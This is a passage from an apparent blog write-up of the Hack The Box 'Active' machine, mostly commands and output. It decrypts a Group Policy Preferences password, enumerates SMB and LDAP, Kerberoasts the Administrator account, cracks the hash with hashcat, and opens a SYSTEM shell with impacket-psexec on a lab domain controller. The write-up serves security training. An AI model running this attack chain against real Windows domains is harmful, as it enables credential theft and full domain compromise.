+</span></span></code></pre></td></tr></table></div></div><ul><li>Refer: [[Group Policy Preferences (GPP) Passwords]]</li></ul><ol start=5><li>We can decrypt with <code>gpp-decrypt</code></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>gpp-decrypt <span class=s1>&#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GPPstillStandingStrong2k18
+</span></span></code></pre></td></tr></table></div></div><ol start=6><li>It is still a valid user account</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>netexec smb 10.129.192.153 -u <span class=s1>&#39;active.htb\SVC_TGS&#39;</span> -p <span class=s1>&#39;GPPstillStandingStrong2k18&#39;</span> 
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SMB         10.129.192.153  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+</span></span><span class=line><span class=cl>SMB         10.129.192.153  445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
+</span></span></code></pre></td></tr></table></div></div><ol start=7><li>List shares we can access</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl> netexec smb 10.129.192.153 -u <span class=s1>&#39;active.htb\SVC_TGS&#39;</span> -p <span class=s1>&#39;GPPstillStandingStrong2k18&#39;</span> --shares
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SMB         10.129.192.153  445    DC               Share           Permissions     Remark
+</span></span><span class=line><span class=cl>SMB         10.129.192.153  445    DC               -----           -----------     ------
+</span></span><span class=line><span class=cl>SMB         10.129.192.153  445    DC               ADMIN$                          Remote Admin
+</span></span><span class=line><span class=cl>SMB         10.129.192.153  445    DC               C$                              Default share
+</span></span><span class=line><span class=cl>SMB         10.129.192.153  445    DC               IPC$                            Remote IPC
+</span></span><span class=line><span class=cl>SMB         10.129.192.153  445    DC               NETLOGON        READ            Logon server share 
+</span></span><span class=line><span class=cl>SMB         10.129.192.153  445    DC               Replication     READ            
+</span></span><span class=line><span class=cl>SMB         10.129.192.153  445    DC               SYSVOL          READ            Logon server share 
+</span></span><span class=line><span class=cl>SMB         10.129.192.153  445    DC               Users           READ       
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>spider_plus</code> is not working</li></ul><ol start=7><li>We can use SMB to access our file directory and get the flag</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>smbclient -U <span class=s1>&#39;active.htb/SVC_TGS&#39;</span> <span class=se>\\\\</span>10.129.192.153<span class=se>\\</span>Users
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>smb: \SVC_TGS\Desktop\&gt; ls
+</span></span><span class=line><span class=cl>  .                                   D        0  Sat Jul 21 11:14:42 2018
+</span></span><span class=line><span class=cl>  ..                                  D        0  Sat Jul 21 11:14:42 2018
+</span></span><span class=line><span class=cl>  user.txt                           AR       34  Sun Feb  1 18:22:00 2026
+</span></span></code></pre></td></tr></table></div></div><h2 id=ldap>LDAP</h2><ol><li>We can dump the contents from LDAP with</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>ldapsearch -b <span class=s2>&#34;DC=active,DC=htb&#34;</span> -s sub <span class=s2>&#34;*&#34;</span> -H ldap://10.129.192.153 -x -LLL -w GPPstillStandingStrong2k18 -D <span class=s2>&#34;SVC_TGS&#34;</span> &gt; ldapDump.txt
+</span></span></code></pre></td></tr></table></div></div><h2 id=wmi---rce>WMI -> RCE?</h2><ol><li>WMI Exec did not work</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>impacket-wmiexec active.htb/SVC_TGS@active.htb -dc-ip 10.129.192.153 -target-ip 10.129.192.153 -debug 
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl>[*] SMBv2.1 dialect used
+</span></span><span class=line><span class=cl>Traceback (most recent call last):
+</span></span><span class=line><span class=cl>  File &#34;/usr/share/doc/python3-impacket/examples/wmiexec.py&#34;, line 96, in run
+</span></span><span class=line><span class=cl>    iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
+</span></span><span class=line><span class=cl>  File &#34;/usr/lib/python3/dist-packages/impacket/dcerpc/v5/dcomrt.py&#34;, line 1083, in CoCreateInstanceEx
+</span></span><span class=line><span class=cl>    iInterface = scm.RemoteCreateInstance(clsid, iid)
+</span></span><span class=line><span class=cl>  File &#34;/usr/lib/python3/dist-packages/impacket/dcerpc/v5/dcomrt.py&#34;, line 1867, in RemoteCreateInstance
+</span></span><span class=line><span class=cl>    resp = self.__portmap.request(request)
+</span></span><span class=line><span class=cl>  File &#34;/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py&#34;, line 861, in request
+</span></span><span class=line><span class=cl>    answer = self.recv()
+</span></span><span class=line><span class=cl>  File &#34;/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py&#34;, line 1325, in recv
+</span></span><span class=line><span class=cl>    raise DCERPCException(rpc_status_codes[status_code])
+</span></span><span class=line><span class=cl>impacket.dcerpc.v5.rpcrt.DCERPCException: rpc_s_access_denied
+</span></span><span class=line><span class=cl>[-] rpc_s_access_denied
+</span></span></code></pre></td></tr></table></div></div><h2 id=smb---rce>SMB -> RCE?</h2><ol><li>When I scan with Netexec SMB module, I see this:</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>netexec smb 10.129.192.153 -u <span class=s1>&#39;active.htb\SVC_TGS&#39;</span> -p <span class=s1>&#39;GPPstillStandingStrong2k18&#39;</span> -M coerce_plus
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SMB         10.129.192.153  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+</span></span><span class=line><span class=cl>SMB         10.129.192.153  445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
+</span></span><span class=line><span class=cl>COERCE_PLUS 10.129.192.153  445    DC               VULNERABLE, DFSCoerce
+</span></span><span class=line><span class=cl>COERCE_PLUS 10.129.192.153  445    DC               VULNERABLE, PetitPotam
+</span></span><span class=line><span class=cl>COERCE_PLUS 10.129.192.153  445    DC               VULNERABLE, MSEven
+</span></span></code></pre></td></tr></table></div></div><h2 id=kerberoasting>Kerberoasting</h2><ol><li>Ok, I cheated a bit again. For some reason, I was so focused on getting a shell on the system but forgot one vector that does not need shell - Kerberoasting!</li><li>Let&rsquo;s check for Kerberoastable users.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>impacket-GetUserSPNs -dc-ip 10.129.192.153 active.htb/SVC_TGS  
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl>ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+</span></span><span class=line><span class=cl>--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+</span></span><span class=line><span class=cl>active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-02-01 18:22:04.416960  
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>We can get the Kerberos Tickets with this command.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>impacket-GetUserSPNs -dc-ip 10.129.192.153 active.htb/SVC_TGS -request -outputfile tgs_tickets
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>Let&rsquo;s try to crack the hash</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>hashcat -m <span class=m>13100</span> tgs_tickets /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c1&lt;SNIP&gt;45b:Ticketmaster1968
+</span></span></code></pre></td></tr></table></div></div><ol start=5><li>Let&rsquo;s check our access</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>netexec smb 10.129.192.153 -u <span class=s1>&#39;active.htb\Administrator&#39;</span> -p <span class=s1>&#39;Ticketmaster1968&#39;</span> 
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SMB         10.129.192.153  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+</span></span><span class=line><span class=cl>SMB         10.129.192.153  445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
+</span></span></code></pre></td></tr></table></div></div><ol start=6><li>To get a shell,</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>impacket-psexec active.htb/Administrator:Ticketmaster1968@10.129.192.153  
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>Impacket</span> <span class=n>v0</span><span class=o>.</span><span class=mf>12.0</span> <span class=o>-</span> <span class=n>Copyright</span> <span class=n>Fortra</span><span class=p>,</span> <span class=n>LLC</span> <span class=ow>and</span> <span class=n>its</span> <span class=n>affiliated</span> <span class=n>companies</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Requesting</span> <span class=n>shares</span> <span class=n>on</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>192.153</span><span class=o>.....</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Found</span> <span class=n>writable</span> <span class=n>share</span> <span class=n>ADMIN</span><span class=o>$</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Uploading</span> <span class=n>file</span> <span class=n>eVdNPlWc</span><span class=o>.</span><span class=n>exe</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Opening</span> <span class=n>SVCManager</span> <span class=n>on</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>192.153</span><span class=o>.....</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Creating</span> <span class=n>service</span> <span class=n>aMmq</span> <span class=n>on</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>192.153</span><span class=o>.....</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Starting</span> <span class=n>service</span> <span class=n>aMmq</span><span class=o>.....</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=n>Press</span> <span class=n>help</span> <span class=k>for</span> <span class=n>extra</span> <span class=n>shell</span> <span class=n>commands</span>
+</span></span><span class=line><span class=cl><span class=n>Microsoft</span> <span class=n>Windows</span> <span class=p>[</span><span class=n>Version</span> <span class=mf>6.1</span><span class=o>.</span><span class=mi>7601</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>Copyright</span> <span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=mi>2009</span> <span class=n>Microsoft</span> <span class=n>Corporation</span><span class=o>.</span>  <span class=n>All</span> <span class=n>rights</span> <span class=n>reserved</span><span class=o>.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>C</span><span class=p>:</span>\<span class=n>Windows</span>\<span class=n>system32</span><span class=o>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=review>Review</h2><ol><li><code>Groups.xml</code> is an interesting file</li><li>We do not need a shell to escalate privileges. Use LDAP to populate BloodHound and SMB/ wsman can be used to get a semi-interactive shell</li></ol></section><footer class=article-footer><section class=article-tags><a href=/tags/htb/>HTB</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/htb-remote-writeup/><div class=article-image><img src=/p/htb-remote-writeup/1.b5688338ca3ce4b1e41ee9ab55ac6419_hu_89d711bc665e1e75.png width=250 height=150 loading=lazy alt="Featured image of post HTB Remote Writeup" data-hash="md5-tWiDOMo85LHkHumrVaxkGQ=="></div><div class=article-details><h2 class=article-title>HTB Remote Writeup</h2></div></a></article><article class=has-image><a href=/p/htb-metatwo-writeup/><div class=article-image><img src=/p/htb-metatwo-writeup/1.925183ec5d19f88905ac762cb261d8cd_hu_90d7115ef374d61d.png width=250 height=150 loading=lazy alt="Featured image of post HTB MetaTwo Writeup" data-hash="md5-klGD7F0Z+IkFrHYssmHYzQ=="></div><div class=article-details><h2 class=article-title>HTB MetaTwo Writeup</h2></div></a></article><article class=has-image><a href=/p/htb-access-writeup/><div class=article-image><img src=/p/htb-access-writeup/1.4f3ed6721d0b1f0d7cb5c076f91c8b33_hu_7103002c3cf8d65.png width=250 height=150 loading=lazy alt="Featured image of post HTB Access Writeup" data-hash="md5-Tz7Wch0LHw18tcB2+RyLMw=="></div><div class=article-details><h2 class=article-title>HTB Access Writeup</h2></div></a></article><article class=has-image><a href=/p/htb-forest-writeup/><div class=article-image><img src=/p/htb-forest-writeup/7dedecb452597150647e73c2dd6c24c7.51700c627e21c04b108d17649b571bee_hu_965f781c9ce4eccf.png width=250 height=150 loading=lazy alt="Featured image of post HTB Forest Writeup" data-hash="md5-UXAMYn4hwEsQjRdkm1cb7g=="></div><div class=article-details><h2 class=article-title>HTB Forest Writeup</h2></div></a></article><article class=has-image><a href=/p/htb-delivery-writeup/><div class=article-image><img src=/p/htb-delivery-writeup/c55af6eadd5b60bac831d73c1a951327.03a81260a84541d40dc13396b054e2b6_hu_c4f878e7fe38a287.png width=250 height=150 loading=lazy alt="Featured image of post HTB Delivery Writeup" data-hash="md5-A6gSYKhFQdQNwTOWsFTitg=="></div><div class=article-details><h2 class=article-title>HTB Delivery Writeup</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2025 -
+2026 Froginacup's site</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
